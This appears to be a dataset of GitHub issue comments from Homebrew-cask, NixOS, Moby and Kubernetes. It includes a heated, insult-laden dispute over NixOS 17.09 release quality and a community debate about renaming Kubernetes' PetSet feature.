homebrew-cask/Homebrew/13201/222794835,13201,"And merged. There are still a few things that need to be done in order to close this issue, but the biggest user-facing change is now present. ",,False
homebrew-cask/Homebrew/13201/252245843,13201,"@friend, what exactly still needs to happen for this to be closed? The only thing I'm seeing that is not yet implemented is  and , which kind of contradict themselves. Why would you be able to override a required location? That would mean the location isn't actually required. ",,False
homebrew-cask/Homebrew/13201/252247982,13201,"@friend  is also yet to be implemented. As for , I do not remember my reasoning there, and I guess it could be stricken (not , though, naturally). ",,False
homebrew-cask/Homebrew/13201/252259742,13201,"I suggested  in  mostly because I think the user should have final say in where their stuff is installed, and may have good reason for overriding the developer's stated location requirements. We should absolutely print a warning when the user overrides  though, so they have no grounds to blame us for a broken installation. ",,False
homebrew-cask/Homebrew/13201/464096761,13201,"@friend, I think we can close this in favour of ",,False
homebrew-cask/Homebrew/13201/464110068,13201,@friend Agreed. At this point other issues should take care of whatever is missing here. ,,False
nixpkgs/NixOS/31045/270040404,31045,"At NixCon 2017 it appeared as if the release managers thought their release went well. Via this message I would like to provide some data to the contrary. I tried to upgrade on two different machines to 17.09 and none of them worked without reconfiguration or without removing features. As such I am still stuck at 17.03 on both and haven't bothered upgrading other machines. For example  Skype doesn't work anymore (broken download) Flash failed (has been fixed, but by the time 10 people have discovered it, you already failed) NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  It is great that doing a rollback was possible (although it does restart the network connection, which would result in some downtime on production infrastructure), but as far as I am concerned no working 17.09 release with feature parity from 17.03 has been released. I am also not happy with the discontinued support of 32 bits code when other distributions still support newer 32 bits code. Not sure whether this is specific to 17.09. There are just a small number of critical packages that tens of millions of people use of which Skype and Flash are an example. NFS is used by a lot of businesses and as such should also be considered important. I don't understand how one can make a release without systematically creating tests based on e.g. Debian's popcon download measures to see whether a package still works. If a release has any QA done on it, I have missed it. What is the point of tagging some git version as a release when the QA on it is non-existent? ",,False
nixpkgs/NixOS/31045/340897127,31045,Flash and Skype in Debian's popcon? -)  I must say our QA for unfree packages is inherently worse just because of the policy not to allow building such packages on the build farm. ,,False
nixpkgs/NixOS/31045/340901577,31045,"To remain positive, QA done specifically for the release   A critical test-set is checked before every channel bump, too, though it would certainly be nice to have more tests.  You may have noticed a couple proposals around tests on NixCon 2017. ",,False
nixpkgs/NixOS/31045/341240038,31045,"Hi there! Yes, indeed, we are quite proud of our release. We merged thousands of pull requests, addressed many many issues, added lots of services and packages, and included many security updates. Our community has also grown quite a lot, and we are proud and excited by the growth and progress of NixOS. You've had a less good experience, and that sucks. It seems you fall in to somewhat less tested areas of NixOS, and that is certain to expose you to sharper corners and more broken things. I'm sorry you  did! Please try upgrading your remaining machines, as 17.03 is no longer supported. We'd rather dedicate everyone's efforts to making 17.09 work sufficiently well. It seems that two of your issues are with unfree software, which NixOS doesn't officially test in any capacity. This is by policy, so any sort of testing on these packages will have to be by volunteer contributors on their own time and hardware. If you'd like to help with this, I'd be happy to work with you to help set something up. Your third issue about NFS NFS with autofs or systemd doesn't work due to a missing symbol (open for months)  Luckily, it seems one of our volunteer contributors has a patch! Maybe you could try it out on your system, and reply to the PR  I don't see an issue about this. Can you open one? When I call , I don't have this issue ... Hmm... Unfortunately NixOS is a small distribution without substantial corporate backing. We still support and build some software for i686, but as you say, we no longer support entire i686 systems. It was a very difficult choice, as we didn't want to leave users without updates, but we believe it was worth the decision. x86_64 has been available for 17 years now and covers almost all of the modern hardware. Dropping i686 support has significantly improved our ability to test and release NixOS. What were you using i686 for? Regarding NFS We have automatic testing of NFS 3 and NFS 4, which pass   tests automatically create servers and clients and run thorough tests to ensure our NFS support works. I think that is pretty good, and pretty cool! However, it doesn't cover the autofs case. Perhaps we should add that to the test? Would you like to send a PR adding it? If so, I'd be happy to do an IRC chat or video call to help you. Maybe you're not familiar with the extensive, innovative automatic VM testing we already do? I think it is pretty cool, and many distros don't have as robust of a test framework we do. Please remember that NixOS is operated by a very wonderful group of volunteers, and your negativity isn't welcome. If you would like to learn about our release proceses, we'd be happy to show and teach you. If you would like to learn about our QA process, we'd be happy to show and teach you. If you would like to become a contributor and help scratch your own itches, make NixOS as good as it can be for your use cases, we'd be happy to show and teach you. If you would like to contribute enough money to hire a team of full time people to work on and support NixOS, we'd be happy to work with you. Thank you, Graham Christensen ",,False
nixpkgs/NixOS/31045/341245378,31045,"I'm pretty sure I cannot add much to @friend's awesome response, except to say we're sorry that you had issues and want to emphasize that we try to deliver the best experience possible but sadly don't have infinite resources and even by far not as many as debian etc. ",,False
nixpkgs/NixOS/31045/341250958,31045,Updated the nixpkgs manual and the wiki that we cannot test or build unfree packages. ,,False
nixpkgs/NixOS/31045/343246015,31045,"@friend I upgraded one server to 17.09. Another system upgrade broke idempotency. That is, . It is my understanding that the NixOS organization claims to achieve the opposite. The i686 device is an end user laptop. If it runs a browser (don't care which one as long as it is graphical) and an ssh client. Regarding your tests, I took a look at one of your links and found a build with a green checkmark which said (  ) to me that says that the QA on the tests themselves is lacking. One of the prerequisites for testing an application is a working system. That is already not working here, so at that point I stopped reading output. While everyone hearts your reaction, this self congratulatory attitude seems overly positive. Perhaps I have different metrics regarding success, though. For example, you count thousands of PRs being merged as an achievement. I count the work of e.g. Ericson2314 as one feature of interest (if it works) despite it being spread out over many PRs. As a leadership principle, undesired behavior should not be encouraged. By celebrating a meaningless metric like the number of merged updates, you only achieve tired contributors (because pressing a merge button cannot possibly be more boring), who at some point will be bored and stop. When people dig a tunnel with a teaspoon you are the one cheering to the team, while I am there thinking why don't they call 3M? Your message about my ""negativity not being welcome"" seems to be straight from SJW hell. While Nix and NixOS do some things pretty good, there is also a lot of stuff which is terrible. Implying you only want ""happy thoughts"" essentially is not leadership, it's a culture suited for the gulags. When someone throws shit in your face, are you also going to describe it as a warm welcome gift? I am not sure whether this is an American thing, but I can assure you that it is not normal to take criticism this badly. In short, your message is more passive aggressive than it should receive a heart. In the future stick to the facts please. The facts are that 17.09 was not ready for use, even today. @friend You are allowed to test and build unfree packages in a lot of cases. Redistributing the resulting builds just is not always allowed. But distributing the recipe for building something and claiming you have followed that recipe and ended up with something that works is perfectly fine. There are a few database vendors which say that you cannot publish benchmarks, but simply saying that you cannot do it, is just lying. Perhaps you don't want to do it or you have no interest in it. Perhaps there is nobody in the entire community interested in it. That still doesn't mean that it cannot be done. So, building a piece of software and then not distributing it to entities who are not a member of the NixOS organisation is perfectly legal. This particular contribution to the manual is of negative value, because it doesn't reference any policy and provides no legal reason. As such, you have just inflated the size of the manual prematurely and someone else (me in this case) needs to point out the fact that you need to redo it again. ",,False
nixpkgs/NixOS/31045/343262736,31045,"Upgrade broke idempotency Could you please elaborate what broke for you? Did you open an issue for that? Claiming something broke without mentioning what or any further explanation is not polite. Why? What are the issues that should be fixed in your opinion? You can't expect everything to be bug-free, even with extensive testing in place. Just look at other community-driven distributions for a reference. Errors happen, may they be in the code or in its tests. nfs4 NixOS Test This could be a bug in the test that nobody noticed before. We should fix that but that doesn't mean that all NixOS tests and their QA are inherently inadequate. Even though the kernel printed a stack trace the VM seemed to work fine. I can't pinpoint an actual cause for the stack trace after a quick look. Unfree packages Our CI system is not able to build packages without pushing it to the binary cache at cache.nixos.org. This would require some code changes. You're free to implement this. As nobody has done this yet or opened an issue that I know of there doesn't seem to be much interest in it. I don't agree that the manual change is useless and that I am lying. It just clarifies that we can't support unfree software unless we look at each license/EULA on a case-by-case basis (""most""). This is the legal reason. If you have a suggestion to improve the wording, please do send it to me or open a PR. You're also welcome to help to add license abstractions for unfree software that we can build, distribute or run. We're just putting everything in the unfree category so we don't have to deal with that. Personally, I'm not interested in improving the unfree packages situation in my spare time and any help is appreciated. ",,False
nixpkgs/NixOS/31045/343264647,31045,"Unfree packages I don't see it as being that much about legal reasons but about current policy for the build farm &ndash; it disallows building ""unfree"" packages and now it's explicitly written down in docs.  Note that many distributions don't even allow them into the main repository.  I'm personally not too motivated by them, but if enough people are interested, surely they can put together a Hydra instance doing the additional unfree tests (and write them first, actually ). Negativity I'm personally not at all against criticizing etc. but it seems only useful if it's done in a ""productive way"", i.e. focused on fixing those problems.  For example, you claimed that idempotency got broken but you provided almost no information about it (so far). ",,False
nixpkgs/NixOS/31045/343749156,31045,"@friend It's not that I don't want to provide information. The available logging information was limited. I got a ""Warning"" that a service didn't restart correctly, but running  directly afterwards did succeed. I looked into  and  and didn't see the details that were needed for a quick resolution. I wouldn't mind running a Hydra instance for a limited number of packages, but not as long as I can't just copy paste something complete in my configuration.nix. @friend The font issue mentioned is the most user visible problem and that's 100% open-source code. If there is an intention to make things better, one could setup a canary machine that compares pixels for various terminal emulators as well as e-mail programs for different versions for rendering 'the quick brown box...'. The reason this would be a reasonable approach is that desirable font changes for a given machine for the same configuration are extremely rare, while searching for ""broken fonts"" on a search engine returns many results. It is a recurring problem resulting from a lack of QA processes. Implementing something like this could be done on various levels, but starting a terminal emulator, waiting for the window to exist with e.g. wmctr, making an automated screenshot (with scrot) and comparing the image to the reference image for equality seems to be in the realm of the possible (that could be a call to diff). Once that is in place, the same tests could be run on virtual graphics devices and shipped to end users even. End users could select that they want to opt in to the test program, where differences would result in an automatic rollback. That way they don't even need to report that their NVIDIA GTX1070 with sprinkles has a problem. Instead, they would just upgrade the next week, possibly automatically, and they would have never seen there was a problem in the first place. I agree that it would be better if Microsoft would maintain a Nix expression for Skype, but since they don't do that... If there was an open-source alternative for Skype, I wouldn't mind to share those with my contacts, but the last time I tried to use one, it didn't end well. Regarding the legal issue You should first establish that there is even a single EULA on this planet which says that you are not allowed to talk about the mere fact that a particular Nix expression accomplishes something when installed on your infrastructure. You can write a whole book about doing highly illegal things. In fact, in the case of Nix it's a mathematical theorem Given a complex state machine (a computer), and then executing a particular program will result in a particular bit being set to 1. There is no way that's illegal. A less contrived argument is that it falls under interoperability laws and you are perfectly allowed to reverse-engineer even Oracle software for such work. I am fairly sure that Oracle would be happy to see its software work on NixOS out of the box with an integrated payment system so they can more easily take your money. It's just that NixOS is so incredibly insignificant right now that merely looking at this website won't have a positive ROI for them. Doing much more than this, like running actual benchmarks and publishing those is against the EULAs of some companies, but that's a completely separate topic. So, my point stands. Legally, your arguments are not sound. If you don't want to do work for free, that's an understandable position, but don't make up legal arguments based on nothing. Just because something is community driven, doesn't mean quality has to suffer. Comparing yourself to other distributions doesn't lead to a significantly better system. The reason NixOS exists, is because all the other distributions were designed badly. The other systems cannot and will never work. ",,False
nixpkgs/NixOS/31045/343752916,31045,"I don't think that will work reliably without repeated maintenance.  There isn't one way to render fonts, and freetype+fontconfig do change the (default) rendering a bit, from time to time.  Still, if someone was manually checking it whenever it changed and somehow was building up a database of acceptable renderings... it might work well and it would be better QA, yes.  (It's not high on my own priority list, but why not have them.) BTW, we do have some VM tests with OCR, screenshotting, etc.  The VM tests aren't very resource-efficient, and some are planned to be migrated to containers, but everyone is welcome to write more tests.  I'm certain we can accommodate reasonable ones on Hydra (for ""free"" SW at least). ",,False
nixpkgs/NixOS/31045/344222060,31045,"This discussion is not leading to anything productive. Therefore I'm closing this issue. The other comment was edited to include the ""incompetence"" of someone responsible for the release. This language is not acceptable. You're just discrediting the hard work of our community without having contributed anything yourself. Please help instead of insulting people who want to help you. hankey I do not understand your arguments about the legal issue and will not waste any time discussing this with you. Please open a PR with alternative wording or shut up about this. ",,False
nixpkgs/NixOS/31045/345473582,31045,"@friend You are lying again, since it has actually led to something productive in the referenced issues. As such you are essentially discrediting me, while in fact I did make a useful contribution, albeit not in code, but with a comment to the upstream author of the package causing the issue. Clearly, that has been useful. If you lack the mental capabilities to understand a legal argument, you should delegate decisions to others who do. Criticism is discrediting ""the hard work"" and can optionally include mentioning things that went well, which is exactly what I did. The fact that you haven't learned the concept of criticism as a grown man must make your life difficult. You are the one wasting the time of the community with your lies and the fact that the released software broke basic features. If you can't be bothered to run a couple of terminal emulators in all the popular environments (there are about 4 or so), why call yourself ""responsible"" for the release? If you want to receive credit for a quality release, make a quality release and you will be credited in history with this fact. The flip side is that when you don't, you get the blame and effectively negative credits. If the person responsible for this isn't incompetent, then the person responsible is not willing to make it work, which would be even worse. If you are going for the ""we don't have the resources angle"", then don't make a release at all. Closing an issue for accurately describing a release, because you disagree and you can is nothing short of what Bashar al-Assad would do. With your policy, you should just add an EULA to NixOS stating that one cannot write a review or publish a bug report about NixOS. Perhaps ask Oracle's legal team for advice on such matters. I sincerely hope that you will learn to take criticism in the future. In a corporation, this issue would be reopened, until all the dependent issues have been solved. Since no such reference has been made, I believe this is not the case. As such the only rational course of action is to reopen this issue. I will close it when the referenced issues have all been resolved. If I can upgrade to 18.03 in some months without issues I will press the thumbs up button to credit the merit of whoever is responsible for the 18.03 release if someone else makes a review of the 18.03 release. In short, please stop pissing me off, especially since I am very limited in the amount of time I can spend here. A community doesn't grow when you piss people off. ",,False
nixpkgs/NixOS/31045/345513710,31045,"As noted, this isn't an appropriate way to engage with the NixOS community. I invite you to not participate in communities you think are full of liars and incompetent people. Maybe a different distribution has more competent members that will leave you satisfied. ",,False
nixpkgs/NixOS/31045/345517096,31045,"I wanted to write a response how we treat people regardless how much they contribute to NixOS community, but I feel we've gone through this so many times that I just blocked @friend You're still welcome to use our free software, but you're not welcome by contributing harsh words. ",,False
moby/moby/6604/36255511,6604,This is likely more informational and nothing actionable now.  It looks like a flag changed and it made it so my container could not start the container (nor did it start upon upgrading) Removing the container and restarting it fixes it; just seems ( ,,False
kubernetes/kubernetes/27430/160405221,27430,"I brought this up back when PetSet was just a proposal, but it didn't get much response. At the risk of being labeled or dismissed as an ""SJW"" or ""preachy vegan,"" or of stirring up drama, please hear me out The name PetSet is derived from the common metaphor in infrastructure of ""pets vs. cattle."" The metaphor encourages infrastructure developers to think of cloud servers as anonymous and fungible resources rather than things to be manually managed by a person. The implication is that instead of treating a server like a pet, which you take care of and treat when it becomes sick, you simply destroy the server and replace it with a new one, as a cattle rancher would simply kill an animal that didn't serve its economic purpose to the rancher. The pet has a personal and emotional value to you, but the cattle is just a commodity. The lesson in infrastructure here is quite a good one, and its value should be preserved, but using this particular metaphor is quite unfortunate, because it perpetuates the unfortunately common belief that the life and well being of a non-human living thing has value only in relation to its value to humans. This may seem like making a mountain out of a molehill, but try to think about how our language perpetuates our culture and our beliefs. Try to think about it in the context of how future generations will see it. In the same way that homophobic or racist language was (and in some cases still is) commonplace and accepted in days past, in the modern world we generally recognize this language as unacceptable because it promotes a negative world view that we have progressed past. Imagine how angry people would be if this feature were called ""WifeSet"" and the analogy were ""wives vs. bar hook-ups.""  We're in an era of increasing empathy, and that empathy is not bounded only to other humans. It affects any being that can feel pain, sadness, or loss, like we can. While I don't claim to have a perfect substitute for this analogy that might replace PetSet, the one I have been using myself is to compare the role of owning a car vs using a taxi or ridesharing service. When you own a car, it is your personal possession. You take care of it. You keep it fueled, cleaned, and maintained in good shape. When it breaks, you get it fixed. In contrast, a taxi or ridesharing service is using a car as a fungible resource. You hail one only when you need the service it provides, and you use it only as long as you require that service. You don't care which car picks you up, or who is driving it, as long as it is fulfills the service. So my own suggestion for a replacement for PetSet is CarSet. If someone has a better idea that seems to ""click"" with people more, all the better. And of course, the feature could be named something more general—it doesn't have to use an analogy. (I recall that originally ""NominalSet"" was being considered.) This issue is not about me or anyone else being ""offended,"" or requesting that the name be changed to CarSet specifically—it's just asking specifically not to invoke the pets vs. cattle metaphor in the name of this feature. Thank you very much for considering this. For context, here is my previous comment from back in the proposal phase. ",,False
kubernetes/kubernetes/27430/226180901,27430,Thanks for speaking up - we will definitely take this into the discussions in the community before this feature moves out of alpha. ,,False
kubernetes/kubernetes/27430/226366676,27430,"Agree.  We went with PetSet as a working name in part because we knew it could never be the ""real"" name, but we didn't have a good name for the concept yet.  Names hold power, so we want to be careful to find something thta captures the problem well.  Having a first impl of the solution will help refine the problem statement, too. ",,False
kubernetes/kubernetes/27430/231476253,27430,@friend I kinda like it ... and it may be a bit too late.  Lots of press about Pet Set already. ,,False
kubernetes/kubernetes/27430/231479424,27430,"Yeah, I may have misunderstood what was meant by changing it before coming out of alpha. To some extent I think the damage is already done now. ",,False
kubernetes/kubernetes/27430/231482659,27430,Blame me 👍   One good thing ... memorable names stick.  Can we close this? ,,False
kubernetes/kubernetes/27430/231488356,27430,I'd still like the team to consider changing it. ,,False
kubernetes/kubernetes/27430/231488776,27430,"I think we really should consider changing it.  Silly names do stick, but they are silly. On Fri, Jul 8, 2016 at 332 PM, Jimmy Cuadra notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/231491609,27430,"@friend we have videos on YouTube, blog posts, tweet, LinkedIn stuff and presentations at conferences, and many many decks with that content. You want to do the rebranding???  It is a big problem to change at this point... ",,False
kubernetes/kubernetes/27430/231492032,27430,"Let's just leave it on the table.  I suspect neither of us have marketing degrees ) On Fri, Jul 8, 2016 at 355 PM, Chris Love notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/231495228,27430,"I'm 100% ok with renaming, and don't feel like there's any pain in doing so. However, CarSet does not feel like a fit. For any who would like name change, please voice here. We'll bring this up at the community meeting next week, and I'd like to settle on a new name by August 1. ",,False
kubernetes/kubernetes/27430/231495247,27430,"Re-quoting myself for emphasis If the name were something that was seen more universally as unacceptable, I don't think ""people already started using the term in social media, oh well, let's keep it"" would be an acceptable attitude. The fact that it's already out there doesn't mean there's no value in changing it. If having a reference to something out in the wild meant you couldn't change it in the future, we wouldn't have things like changelogs and semantic versioning. ",,False
kubernetes/kubernetes/27430/231496684,27430,"CarSet does not have any relevance in tech, can we come up with something techy or ship like? I am sorta on the side of not changing it, but we need a good name.  If we do change it we gotta change it quite quickly. People will have PetSet in production very quickly if not now.  Changing code because a team chooses to change branding probably will not make people happy. ",,False
kubernetes/kubernetes/27430/231497336,27430,"Let's be sure to separate this out into two discussions - deciding on a change, vs the naming process.  We already have a pattern to deal with the later, but getting the general agreement in the community that the name should be changed probably is what we want to stay focused on for now. On Fri, Jul 8, 2016 at 734 PM, Chris Love notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/231502807,27430,"@friend I'm not bound to CarSet (though PetSet doesn't have any ""relevance in tech"" either)—I was just offering a suggestion that used a similar metaphor, so as not to simply ask the team to do something without offering a possible way to do it. People who have worked on the feature or been involved in its design discussions will probably have better ideas, since they have the best understanding of the use cases for the feature. ",,False
kubernetes/kubernetes/27430/231509945,27430,"Just stumbled on this thread...adding my $0.02.  Naming IS HARD!!! I've named dozens of products, features and even companies and its never been a quick or simple process. Everyone has an opinion. 100% certain there will be someone that does't like a name. Getting everyone to agree on a name shouldn't be a requirement Very hard to re-name something once it has any kind of name recognition.   As for PetSets in particular, I think it's a pretty good name. Both informative and evocative (IMO in a good way), which are two of the most important aspects of a name. That said, its really the name of one of several similar kind of features. And within this broader context it lacks the consistency you'd expect across similar things. Don't have any of the history, but I thought Replication Controllers were renamed to Replica Sets to introduce the idea of Sets which could then be applied to different kinds of sets (i.e. PetSets). But as a group, these two names seem random and they miss the opportunity to apply further consistency across Sets (i.e. one name is literal, the other analogous). Also, will there be other kinds of Sets? If not, then random is probably OK. But if there will be more kinds of Sets, then the next one would also have to be random since you definitely shouldn't have two 'literal' names with another that is 'analogous'. That would just make PetSets seem too casual and not serious. ",,False
kubernetes/kubernetes/27430/231513955,27430,"FamilialSet would get the same idea across.  Each member of a family is special, cares about its peers, and often has a particular role, and everyone mourns the loss of any one member. Or something similar like KinSet or KindredSet On Friday, July 8, 2016, chrismarino notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/231515971,27430,"JetSet seems fitting (and one letter off). Besides relating the term ""jet set"", a JetSet is composed of Jets, which should be handled with care ",,False
kubernetes/kubernetes/27430/231518195,27430,"The name petset is derived from the fact that I care about my pets, regardless of what anyone else thinks about their cattle. Cattle are sacred in some places, food in others, and I view that as a culture difference.  I won't use pets vs cattle to explain this feature where I'm from, but pets vs servers works just as well ) ",,False
kubernetes/kubernetes/27430/231519362,27430,@friend That's a fair point. Pets have value whether or not they are compared to something else. But the usage of the term in Kubernetes is not without context Pets vs cattle is a metaphor very commonly used in writing about modern infrastructure. A quick Google search even brings up usage of the term in Kubernetes's own blog. It seems to sidestep the issue I'm trying to address to suggest that the term has no prior meaning in this area of our industry. There are an infinite number of things this feature could be called. Surely there is something that would work that doesn't use this metaphor. ,,False
kubernetes/kubernetes/27430/231528316,27430,"We can publish options for discussion here. Instead of using metaphors, which can have unintended meaning, let's try a descriptive name. Should ideally be easy to understand for someone with a Linux background. Throwing out some options.  PersistentSet StatefulSet or StateSet PermanentSet StickySet BindSet NamedSet SavedSet StoredSet SequentialSet OrderedSet  ",,False
kubernetes/kubernetes/27430/231541843,27430,"I think that's a good initial set of names (pun intended). I don't think we're too late to change it, as others have pointed out. Yes, there are videos and other materials out there, but it will only get worse with time. If the community agrees that this is a worthwhile thing to do, it should act quickly, otherwise we end up with fuzzy transitions like the one from Replication Controllers to Deployments and Replica Sets. If we can come up with and agree on API method and parameter names we can certainly converge on object names like these. I find several of the ones proposed by @friend to be simple and self-explanatory. I personally think the first two work well PersistentSet or StatefulSet, as opposed to EphemeralSet. ",,False
kubernetes/kubernetes/27430/231545530,27430,"My $0.02 vote from Aparna's excellent list  NamedSet PersistentSet  On the crazy idea side  Snowflake Set Borg Set (like ""I am 7 of 9"")  I was never fond of PetSet - only for the reason that it is not obvious what it is on its face, and breaks with the obvious naming we have across the product. A ""ReplicaSet"" is, plainly, a set of replicas. A ""Deployment"" is ... well ... a deployment. Etc. The word I'm looking for here is ""what is the opposite of a bunch of exact replicas, each of which are unique in some way, but still have some similarity as a group."" Maybe I'm coming around to Family/FamilialSet. Or ClusterSet? ",,False
kubernetes/kubernetes/27430/231553485,27430,"Aparna's list is great. My favorite of the bunch is StatefulSet, since the term ""stateful application"" is used in the container world and should be pretty easily understood. In discussion of container orchestration systems, you'll often hear people ask, ""Great, but how does it handle stateful apps?"" In a similar way to how the other ThingSets are sets of Things, a StatefulSet is a set of stateful pods/apps. It could even be more explicit StatefulPodSet. ",,False
kubernetes/kubernetes/27430/231554652,27430,"FamilySet probably fails the ""is a recognizable term for describing the concept at play"", and is also redundant (a family is another way of saying ""set of humans with shared responsibilities for raising biological offspring"", so ""a set set""). The distinguishing characteristics of the use case for this object is  To preserve individual identity for fungible entities To provide predictable ordering and control as those entities change To enable the software entities to identify and recognize the other entities by those identities To get access to a consistent storage mechanism (because their identity also corresponds to data)  Sequence and ordering are relevant, but not strictly necessary (in the future we will probably introduce other naming and ordering schemes, which may prevent sequential / ordered from being accurate).  State (or at least, storage) is not required, although I agree that in practice most of the use of this set would be for stateful services. On Sat, Jul 9, 2016 at 413 PM, Jimmy Cuadra notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/231560045,27430,"It's hard to pick a name that doesn't extol any single feature of petset (such as state, persistence, ordering, ordinality, name, sequence). This is one feature we built in reverse, by prototyping a bunch of applications that didn't fit in any existing bucket and formalizing their requirements into an api. This process is sometimes called domain modelling, and the number of things required by this domain is &gt; 1 word. We faced a similar dilemma choosing its api-group. I think ""is a recognizable term for describing the concept at play"" might be a trap, and we just need to call it a word that makes people think of the domain. ",,False
kubernetes/kubernetes/27430/231603097,27430,Aparna's list is awesome! My $0.02 vote is  PersistentSet NamedSet OrderedSet  We should consider primary use-cases of PetSet to choose name ,,False
kubernetes/kubernetes/27430/231765883,27430,"Here are a few more options  DistinctSet UniqueSet SuiSet (stateful uniquely identifiable; also a play on sui generis) PetSet, redefined as an abbreviation/backronym of PersistentSet (""Pe't"")  ",,False
kubernetes/kubernetes/27430/231768523,27430,I like this @friend ,,False
kubernetes/kubernetes/27430/231811578,27430,"So the features of Pet Set are based on identity and don't have to include Data existence.  I can have a stateless Pet Set of an application that required known identity for quorum.  I would ask to stay away from names that include references to other components like Persistent Volumes when you don't need a PV for a Pet Set. But back to @friend's point, should we focus on if we want to change the name to what the name should be on this issue?  @friend you mentioned that we have a procedure for naming stuff? ",,False
kubernetes/kubernetes/27430/231835429,27430,"I had suggested splitting so that we'd have a discussion about the bits independently, but I think it's fine to continue proposing ideas here. Generally this would go through the proposal process - we'd identify a list of names, people would register objections to the names, and then given the list of candidates try and remove outcomes that don't measure up based on the objections.  Once we've gone through that round, assuming we have a number of candidates that people feel strongly about, we'd try to refine them with general agreement amongst the API and proposal reviewers (with the API reviewers being final deciders). I'd probably argue that getting this name right is extremely important - important enough that we want to find a name that is good enough that all disagreement is resolved through strong arguments for why a name is best  It succinctly describes the core goal It is recognizable to a layman in the ""systems administration"" or ""web software"" fields as matching that core goal, and it would be best if explaining it can be done by simple analogy to something those users are already familiar with It ends with *Set We prefer descriptive names over ""cute"" names inasmuch as we're trying to describe a core pattern vs creating marketing material, keeping in mind patterns that can't be explained easily aren't good patterns.  I think most of those have already been stated here, and if folks want to continue brainstorming here please do so. On Mon, Jul 11, 2016 at 151 PM, Chris Love notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/232428634,27430,"From the latest blog post  wat. I think this is a pretty good example of how ""pet"" isn't the right name for this even technically since a pet has a number of extra implications. ♠NamedSetIdentitySetPersistentSetPersistentSetNamedSet + (n * PersistentVolumeClaim)`. Also relevant re the blog post. This really needs to happen sooner rather than later or it's guaranteed to stick or at least be too complicated to change due to docs/issues/code that already references the current name. ",,False
kubernetes/kubernetes/27430/232512518,27430,"For completeness, names that have been proposed in the past that I don't see above include NominalSet, ShardSet, and IndexedSet. The distinguishing characteristics we want to convey were specified here  expand on the storage point The controller currently known as PetSet is unique among all the controllers in that it can instantiate and manage PVCs as well as pods, and, though it has other uses, the driving motivation for this controller is improved support for stateful workloads. ref #260, #18016, #3024 ",,False
kubernetes/kubernetes/27430/232523281,27430,"Another blog post has appeared which quite heavily uses the pets vs. cattle metaphor and makes it very clear that this is the derivation of the name of PetSet. Is there a way to communicate to the Kubernetes marketing team that a rename is being discussed? This kind of attention on the name PetSet is why I emphasized ""before release"" in the title of this issue. Thanks to everyone participating in the discussion to help find a more fitting name. ",,False
kubernetes/kubernetes/27430/232529652,27430,"Sets are unordered.  Lists, Arrays and Sequence all imply order and having indexes.  So, I don't get why it has to end in set.  I don't even think it is good for it to end in set. Which opens up  PodArray PodList PodSequence PetArray  uuh, no... wait, that last one doesn't work smirk    ",,False
kubernetes/kubernetes/27430/232530065,27430,"They aren't replicas, but they aren't totally different either.  There is only one template.  They all have to have the same PodSpec.  So, ""distinct"" or snowflake overemphasize the differences. ",,False
kubernetes/kubernetes/27430/232530309,27430,"It would be nice to capture that they are similar, and cooperate to fulfill a single purpose (what we would call a service if that name wasn't taken).  But they have numbers. Which leads me to the name ""Team"".  They work together, but they have numbers on the back of their jerseys so that you can tell them apart. ",,False
kubernetes/kubernetes/27430/232531486,27430,"Another thought While the dictionary definition of ""Replica"" is an identical copy.  But that is not how we use it in computer systems.  MySQL, which is a key motivating use case for PetSet, talks about the master and slave (yes, I know another offensive term), as both being replicas.  In fact, zookeeper and cassandra talk about replication and replication factors -- which I understand refers to specific data being replicated rather than instances, but all these apps that we are talking about running with PetSet, there is replication involved. So, what about  ReplicaList ReplicaVector ReplicaSequence ReplicaArray  I sort of like ReplicaArray best because array index is a thing, but list index, vector index, and sequence index are not so much things. I also like that it suggests some similarity with ReplicaSet. Also, the PetSet type has a  field in it, so, yeah. ",,False
kubernetes/kubernetes/27430/232541730,27430,"Team, Lineup, Ensemble, Cohort or Variants. I agree with @friend that the name needs to convey some degree of similarity rather than uniqueness. ",,False
kubernetes/kubernetes/27430/232717586,27430,Can someone change the name of this issue?  Release has already occurred ;) StatefulSet gets my vote. Or on the radical side PetSet ... just keep the darn name. ,,False
kubernetes/kubernetes/27430/232737933,27430,plus one to StatefulSet ,,False
kubernetes/kubernetes/27430/232859167,27430,"In my mind, the general use case that stands above the rest is that by contrast to all other pod deployment mechanisms this is the one that allows stateful pods. So my vote is for  - it is after all a set of states (thanks @friend for a great list); it sounds the best to me and is grammatically akin to ,  and ; but I would side with  as a next best option. Terms that start with ""Replica"" will be confusing next to . And names that make the indexing prominent don't describe why you would want to use pods that are indexed.  is a good suggestion, but ""Teamwork"" could also describe what ReplicaSets do. ",,False
kubernetes/kubernetes/27430/233203824,27430,"plus one for StatefulSet, @friend when reading your comment i was already confused by this, thinking it was already changed to ReplicaSet. Please do not pick a name that is too similar as it would be very easy to confuse the two (ReplicationController vs ReplicaSet vs ReplicaSequence ??? Very confusing to a beginner). ",,False
kubernetes/kubernetes/27430/234353092,27430,"plus one to ShardSet. A shard of a distributed database has a stable identity and associated persistent storage. Shards may added/removed from the system, but it is a non-trivial operation that requires careful planning and execution. This is the gist of a PetSet as I understand it. Also the terms ""shard"" / ""sharding"" are already familiar the intended users of this feature, which is IMO an advantage over more abstract names like OrderedSet, ReplicaVector. ",,False
kubernetes/kubernetes/27430/234358050,27430,I think ShardSet is a little too narrow because sharding is a subset of what PetSets do. PetSets allow the stateful representation of shards. PetSets are also for the stateful management of unsharded data like SQL master/slave replicas or etcd clusters where data is replicated but not sharded. As best as I can tell the commonality is statefulness. ,,False
kubernetes/kubernetes/27430/234361631,27430,"Agreed, but does ""StatefulSet"" make sense? Are the things in the set stateful, or the set itself? I think most people would assume the latter. ShardSet does not have this ambiguity. ""Replica"" has already been established as the identical, interchangeable kind in Kubernetes lingo, so I think using a different word is warranted for the replicas that have distinguishable identity. ",,False
kubernetes/kubernetes/27430/235313550,27430,I would say - keep PetSet and focus on something more important. There are already Masters/Slaves and BlackLists/WhiteLists and we live with it ) ,,False
kubernetes/kubernetes/27430/235355156,27430,"plus one for PetSet ShardSet or StatefulSet are not better than what we have now. On Tue, Jul 26, 2016 at 554 PM, wallverb notifications@friend.com wrote ",,False
